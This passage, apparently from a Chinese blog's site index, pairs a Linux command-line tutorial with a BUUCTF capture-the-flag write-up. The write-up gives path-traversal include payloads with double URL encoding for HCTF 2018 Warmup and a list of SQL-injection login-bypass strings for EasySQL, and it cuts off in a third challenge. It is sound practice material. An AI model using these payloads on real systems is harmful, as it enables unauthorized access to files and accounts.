align="center">/opt</td><td align="center">可选目录，常用于存放<strong>第三方软件包和数据文件</strong></td></tr><tr><td align="center"><strong>/proc</strong></td><td align="center">进程目录，存放现有硬件及当前<strong>进程的相关信息</strong></td></tr><tr><td align="center"><strong>/root</strong></td><td align="center"><strong>root用户的主目录</strong></td></tr><tr><td align="center">/sbin</td><td align="center">系统二进制目录，存放许多GNU管理员级工具</td></tr><tr><td align="center">/run</td><td align="center">运行目录，存放系统运作时的运行时数据</td></tr><tr><td align="center">/srv</td><td align="center">服务目录，存放本地服务的相关文件</td></tr><tr><td align="center">/sys</td><td align="center">系统目录，存放系统硬件信息的相关文件</td></tr><tr><td align="center"><strong>/tmp</strong></td><td align="center">临时目录，<strong>可以在该目录中创建和删除临时工作文件</strong></td></tr><tr><td align="center">/usr</td><td align="center">用户二进制目录，大量用户级的GNU工具和数据文件都存储在这里</td></tr><tr><td align="center"><strong>/var</strong></td><td align="center">可变目录，用以存放经常变化的文件，比如<strong>日志文件</strong></td></tr></tbody></table><h4 id="2-1-2-遍历目录"><a href="#2-1-2-遍历目录" class="headerlink" title="2.1.2 遍历目录"></a>2.1.2 遍历目录</h4><p>在Linux文件系统上，可以使用<font color="#FF5E2A" size="2">切换目录命令cd将shell会话切换到另一个目录</font>。 cd命令的格式非常简单：<strong>cd destination</strong><br>cd命令可接受单个参数destination，用以指定想切换到的目录名。<strong>如果没有为cd命令指定目标路径，它将切换到用户主目录。</strong><br>destination参数可以用两种方式表示：一种是使用<strong>绝对文件路径</strong>，另一种是使用<strong>相对文件路径</strong>。</p><p><strong>1.绝对文件路径</strong></p><p>​            <font color="#FF5E2A" size="2">对文件路径总是以正斜线（ /）作为起始，指明虚拟文件系统的根目录。</font>  </p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928215.png" style="zoom:200%;"><p>如图刚开始是在/root目录中，如果切换到usr/bin目录中，就直接使用 cd /usr/bin，（一定最开始是根目录！）</p><p>这里的 <strong>pwd 是显示当前所在的位置</strong>的命令。</p><p><strong>2.相对文件路径</strong></p><p>就是基于你目前所在的目录进行相对的移动。</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928216.png" style="zoom:150%;"><p>如图，刚开始在usr目录中，要进入usr的lib目录中，则可以直接 cd lib 。（ls 是显示当前目录下的文件和子目录，后面会讲。）</p><p>有两个特殊字符可用于相对文件路径中：</p><ul><li> <strong>单点符（ .）</strong>，表示当前目录；</li><li> <strong>双点符（ ..）</strong>，表示当前目录的父目录。</li></ul><p>重点就是双点符，可以较为方便的在相对文件路径中使用：</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928217.png" style="zoom:150%;"><h3 id="2-2-文件和目录列表"><a href="#2-2-文件和目录列表" class="headerlink" title="2.2 文件和目录列表"></a>2.2 文件和目录列表</h3><h4 id="2-2-1-基本列表功能"><a href="#2-2-1-基本列表功能" class="headerlink" title="2.2.1 基本列表功能"></a>2.2.1 基本列表功能</h4><p><strong><code>ls [path]</code> - 列出文件</strong></p><p>该程序<code>ls</code>允许您列出<strong>目录中的文件和其子目录</strong>。它可以传递许多不同的参数（或“标志”）来控制输出。</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635096.png"></p><p><strong><code>ls -F</code></strong>  带-F参数的ls命令<strong>轻松区分文件和目录</strong>  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635097.png"></p><p>Linux经常<strong>采用隐藏文件来保存配置信息</strong>。在Linux上，隐藏文件通常是<strong>文件名以点号开始</strong>的文件。这些文件并<strong>没有</strong>在默认的ls命令输出中显示出来，因此我们称其为<font color="#FF5E3A" size="3">隐藏文件</font>。  </p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635098.png"></p><p>ls支持选项合并如：<code>ls -Fa</code></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635100.png"></p><p><strong><code>ls -l</code> 显示附加信息，长列表输出</strong></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635101.png" style="zoom:150%;"><ul><li><p> 文件类型，比如目录（ d）、文件（ -）、字符型文件（ c）或块设备（ b）；</p></li><li><p> 文件的权限；</p></li><li><p>文件的硬链接总数；</p></li><li><p> 文件属主的用户名；</p></li><li><p> 文件属组的组名；</p></li><li><p> 文件的大小（以<strong>字节</strong>为单位）；</p></li><li><p> 文件的上次<strong>修改时间</strong>；</p></li><li><p> 文件名或目录名。  </p></li></ul><h4 id="2-2-2-过滤输出列表"><a href="#2-2-2-过滤输出列表" class="headerlink" title="2.2.2 过滤输出列表"></a>2.2.2 过滤输出列表</h4><p>当要输出指定文件或者指定开头等的文件时，可以使用过滤查询：<code>ls -l x</code> ，过滤器就是一个进行简单文本匹配的字符串。可以在要用的命令行参数之后添加这个过滤器  。<strong>同时支持通配符匹配</strong>。</p><ul><li><p> 问号（ ?）代表<strong>一个</strong>字符；</p></li><li><p> 星号（ *）代表<strong>零个或多个</strong>字符。  </p></li></ul><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635102.png" style="zoom:150%;"><h4 id="2-2-3-tree"><a href="#2-2-3-tree" class="headerlink" title="2.2.3 tree"></a>2.2.3 tree</h4><p>还有一个遍历文件功能指令tree,能较好地展示文件之间的层级结构，将本目录中的文件、子目录、子目录中的文件都以树形展示出来：（Debian 版本没有这个指令，可以<code>apt-get tree</code>安装），不要尝试<code>tree /</code>,除非你觉着很炫酷hhhh</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635103.png"></p><h3 id="2-3-处理文件"><a href="#2-3-处理文件" class="headerlink" title="2.3 处理文件"></a>2.3 处理文件</h3><h4 id="2-3-1-创建文件"><a href="#2-3-1-创建文件" class="headerlink" title="2.3.1 创建文件"></a>2.3.1 创建文件</h4><p><strong>touch</strong>命令轻松创建<strong>空文件</strong>（<strong>注意是空文件，不代表可以是空目录哦</strong>）。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">touch</span> test_one<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635104.png" style="zoom:150%;"><h4 id="2-3-2-复制文件"><a href="#2-3-2-复制文件" class="headerlink" title="2.3.2 复制文件"></a>2.3.2 复制文件</h4><p><strong>cp</strong>命令将文件或目录从一个位置复制到另一个位置  。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cp</span> <span class="token operator">&lt;</span>source<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>destination<span class="token operator">&gt;</span> - 复制文件-i选项，强制shell询问是否需要覆盖已有文件。-R参数，可以用它在一条命令中递归地复制整个目录的内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635105.png"></p><p>可以看到加上 -i 选项，就会强制询问是否覆盖，<strong>最好每次都带上</strong>，写 yes/no 就可。可以看到修改时间没变。</p><p>cp命令的-<strong>R参数</strong>。可以用它在一条命令中<strong>递归地复制整个目录的内容</strong>。  </p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201161635106.png" style="zoom:150%;"><h4 id="2-3-3-移动和重命名文件"><a href="#2-3-3-移动和重命名文件" class="headerlink" title="2.3.3 移动和重命名文件"></a>2.3.3 移动和重命名文件</h4><p>在Linux中，<strong>重命名文件称为移动（ moving）</strong> 。 mv命令可以将文件和目录移动到另一个位置或重新命名。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Moving a file "into" another file is how you rename files</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># mv test_file test_file1</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># ls -F</span>test2/testdir/  test_file1  test_file2<span class="token comment"># Move file into directory</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># mv test_file1 testdir/</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>├── test2│   ├── test_file│   └── test_file2├── testdir│   └── test_file1└── test_file2<span class="token number">2</span> directories, <span class="token number">4</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-3-4-删除文件"><a href="#2-3-4-删除文件" class="headerlink" title="2.3.4 删除文件"></a>2.3.4 删除文件</h4><p>在Linux中，删除（ deleting）叫作移除（ removing） 。 bash shell中删除文件的命令是 <strong>rm</strong>。  -+</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable"><span class="token variable">`</span><span class="token function">rm</span> <span class="token operator">&lt;</span>filename<span class="token operator">&gt;</span><span class="token variable">`</span></span> - 永久删除文件-i命令参数提示你是不是要真的删除该文件-r参数删除目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test/test2<span class="token comment"># rm -i test_file</span>rm: remove regular empty <span class="token function">file</span> <span class="token string">'test_file'</span>? yroot@VM-16-11-debian:/tmp/test/test2<span class="token comment"># ls -l</span>total <span class="token number">0</span>-rw-r--r-- <span class="token number">1</span> root root <span class="token number">0</span> Jan <span class="token number">16</span> <span class="token number">15</span>:35 test_file2-r参数删除目录：root@VM-16-11-debian:/tmp/test<span class="token comment"># rm -r test2</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>├── testdir│   └── test_file1└── test_file2<span class="token number">1</span> directory, <span class="token number">2</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-4-处理目录"><a href="#2-4-处理目录" class="headerlink" title="2.4 处理目录"></a>2.4 处理目录</h3><h4 id="2-4-1-创建目录"><a href="#2-4-1-创建目录" class="headerlink" title="2.4.1 创建目录"></a>2.4.1 创建目录</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">mkdir</span> New_Dir-p参数：同时创建多个目录和子目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># mkdir -p test2/test3</span>root@VM-16-11-debian:/tmp/test<span class="token comment"># tree</span><span class="token builtin class-name">.</span>├── test2│   └── test3├── testdir│   └── test_file1└── test_file2<span class="token number">3</span> directories, <span class="token number">2</span> files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-4-2-删除目录"><a href="#2-4-2-删除目录" class="headerlink" title="2.4.2 删除目录"></a>2.4.2 删除目录</h4><p>rmdir命令<strong>只删除空目录</strong>。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">rmdir</span> mydir<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># rmdir test2</span>rmdir: failed to remove <span class="token string">'test2'</span><span class="token builtin class-name">:</span> Directory not empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-5-查看文件"><a href="#2-5-查看文件" class="headerlink" title="2.5 查看文件"></a>2.5 查看文件</h3><h4 id="2-5-1-查看文件类型"><a href="#2-5-1-查看文件类型" class="headerlink" title="2.5.1  查看文件类型"></a>2.5.1  查看文件类型</h4><p>在显示文件内容之前，应该先了解一下文件的类型。如果打开了一个二进制文件，你会在屏幕上看到各种乱码，甚至会把你的终端仿真器挂起。  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">file</span> my_file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># file testdir</span>testdir: directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-5-2-查看整个文件"><a href="#2-5-2-查看整个文件" class="headerlink" title="2.5.2 查看整个文件"></a>2.5.2 查看整个文件</h4><p><strong><code>cat &lt;filename&gt;</code> - 打印文件</strong></p><p>要将文件的内容快速转储到控制台，请使用<code>cat</code>.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> file1-n参数会给所有的行加上行号。-b参数会给只是文本的行加上行号。The quick brown fox jumped over the lazy dog.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong><code>more</code>命令</strong></p><p><code>cat</code>命令的主要缺陷是：一旦运行，你就无法控制后面的操作。为了解决这个问题，开发人员编写了<code>more</code>命令。 <code>more</code>命令会显示文本文件的内容，但会在显示每页数据之后停下来。 可以通过按空格键或回车键以逐行向前的方式浏览文本文件。浏览完之后，按q键退出。 </p><p><strong><code>less</code>命令</strong></p><p><strong><code>less &lt;filename&gt;</code> - 显示和滚动文件</strong></p><p><code>less</code>如果您想查看一个不完全适合一个屏幕的长文件的内容，该程序很有用。要在运行后退出，请按 <code>q</code>。</p><p>你可以用更少的时间做很多其他的事情，但一件有用的事情是能够搜索。您可以搜索<code>/banana</code>以查找文件中“香蕉”的所有实例。</p><h4 id="2-5-3-查看部分文件"><a href="#2-5-3-查看部分文件" class="headerlink" title="2.5.3 查看部分文件"></a>2.5.3 查看部分文件</h4><ol><li><p><strong><code>tail</code>命令</strong><br>tail命令会显示文件最后几行的内容（文件的“尾部”）。默认情况下，它会显示文件的末尾10行。  可以向tail命令中加入-n参数来修改所显示的行数:  <code>tail -2 text</code> 。</p></li><li><p><strong><code>head</code>命令</strong>  </p><p>head命令，顾名思义，会显示文件开头那些行的内容。默认情况下，它会显示文件前10行的文本。同理可以加入 -n 参数指定行数。 </p></li></ol><hr><p>本章的学习就到这啦，下章将继续讨论bash shell的命令，并了解更多管理Linux系统时经常用到的高级系统管理命令。  </p><p><font color="#FF9999" size="2">文章参考：Linux命令行与shell脚本编程大全.第2版 by 布鲁姆，布雷斯纳汉 (z-lib.org)</font></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux2/202201151928218.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf练习[1-10]</title>
      <link href="/posts/myh10004.html"/>
      <url>/posts/myh10004.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-HCTF-2018-Warmup"><a href="#1-HCTF-2018-Warmup" class="headerlink" title="1.[HCTF 2018]Warmup"></a>1.[HCTF 2018]Warmup</h2><p>考察：php审计：mb_substr()+mb_strpos()绕过</p><p>打开题目地址后出现的是一个滑稽的表情，接着查看原码发现注释有 source.php ，访问后得到一段源码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">"source"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"source.php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"hint"</span><span class="token operator">=</span><span class="token operator">&gt;</span><span class="token double-quoted-string string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//白名单</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token double-quoted-string string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">//需要同时满足三个条件：传入了file参数，并且是字符串，并且满足checkfile函数</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//执行给出的file参数值</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter important">?&gt;</span></span> flag{408cfb51-0d75-4976-9d2e-e431e5d0fd77}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先来介绍下两个函数mb_substr()+mb_strpos()：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">**mb_strpos()**：返回要查找的字符串在别一个字符串中首次出现的位置    mb_strpos(    string $haystack,    string $needle,):int// haystack：要被检查的字符串。// needle：要搜索的字符串**mb_substr()** 函数返回字符串的一部分。    mb_substr(    string $str,    int $start,    int $length = NULL,):string//str 必需。从该 string 中提取子字符串。//start 必需。规定在字符串的何处开始。//ength 可选。规定要返回的字符串长度。默认是直到字符串的结尾request() //可以以get或者post提交参数include //文件包含,包含并运行文件中的内容$_page . '?' //将$_page后拼接 ? public static function checkFile(&amp;$page)&amp;&amp; emmm::checkFile($_REQUEST['file'])上面这代码表示 将request的file值 传入$page，其实就是将file参数传入到page中&amp;引用传递变量。这是通过在函数内建立一个本地变量并且该变量在呼叫范围内引用了同一个内容来实现的。例如： <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">function</span> sub <span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$var</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$var</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>    <span class="token function">sub</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>将使 $num 变成 6。这是因为在 sub 函数中变量 $var 指向了和 $num 指向的同一个内容。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    通过源码提示hin.php，访问之后得到flag在ffffllllaaaagggg中，所以我们肯定要使include包含这个文件，从而得到我们的flag。但是通过checkfile函数可知，返回true的条件是所传入的file参数值（或者是经过函数处理后的值）需要在白名单里，所以直接传入ffffllllaaaagggg肯定不得行。这是最终要的来啦，<strong>就是考虑题目给的函数，通过函数的处理的值使得我们能够返回true</strong>。所以构造payload为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">?</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg<span class="token number">2.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">3</span>f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg <span class="token comment">//这里的%3f是 ? 经过ulr加密后的值，由于每次传参十，都会自动urldecode一次，所以等价于第一个</span><span class="token number">3.</span>file<span class="token operator">=</span>source<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">253</span>f<span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>ffffllllaaaagggg <span class="token comment">//这里的%253f是 ? 经过两次ulr加密后的值，在经过一次自动处理以及checkfile函数里的urldecode函数处理一次后就等价于第一个了，同样可以返回true</span>    <span class="token comment">//说明一下../是返回上一级目录，首先在source.php?加一个 / ，使其成为不存在的目录，然后../就返回到source.php所在的目录，之后一次次试在哪个目录里，自己也可以在本地试试../的目录关系</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后传入payload就会得到flag啦~</p><p><strong>再补充一下 ./   ../   / 的说明：</strong></p><pre class="line-numbers language-none"><code class="language-none">./ 表示当前目录下../ 表示上一级目录/ 表示根目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948708.png" style="zoom:150%;"><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948710.png" style="zoom:150%;"><p>如图，以这个文件夹为例，在buu文件中，有2.png，那就表示为</p><pre class="line-numbers language-none"><code class="language-none">./buuctf练习/1.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在此目录下，有hello.md，那就表示为：</p><pre class="line-numbers language-none"><code class="language-none">./hello.md 或者 hello.md<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果2.png在上层目录的一个image文件下，那就是：</p><pre class="line-numbers language-none"><code class="language-none">../image/1.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="2-极客大挑战-2019-EasySQL"><a href="#2-极客大挑战-2019-EasySQL" class="headerlink" title="2.[极客大挑战 2019]EasySQL"></a>2.[极客大挑战 2019]EasySQL</h2><p>根据题目提示是SQL注入，所以先试着判断注入点和引号闭合方式：在username输入：1’，密码随便输：1，出现语法报错：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948711.png"></p><p>则可以知道是单引号闭合，接着开始试试万能密码：1’ or 1=1#     ,则输入后后台语句大致就是：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from table_name where username='1' or 1=1 # ' and password='1' ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于#会把后面的都注释掉，所以就等价于：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from table_name where username='1' or 1=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可知 1=1 是个恒等式，所以就登陆成功了，得到flag~</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948712.png"></p><p>下面收集一些万能密码：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">'or'='or''or 1=1--''or 1=1--'or'a'='a"or "a"="a"or"="a'='a ')or('a'='aor 1=1--a'or' 1=1--"or"="a'='a'or''='1 or '1'='1'=11 or '1'='1' or 1=1'OR 1=1%00"or 1=1%00'xoradmin' or 'a'='a 密码随便<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="3-极客大挑战-2019-Havefun"><a href="#3-极客大挑战-2019-Havefun" class="headerlink" title="3.[极客大挑战 2019]Havefun"></a>3.[极客大挑战 2019]Havefun</h2><p>这题还是比较简单的哈，进去之后就是一张可爱的猫猫图，有点乖哈哈，查看网页源代码，发现有一段PHP代码，就是get型参数传入：</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buuctf/202201151948713.png"></p><p>然后构造payload为：<a 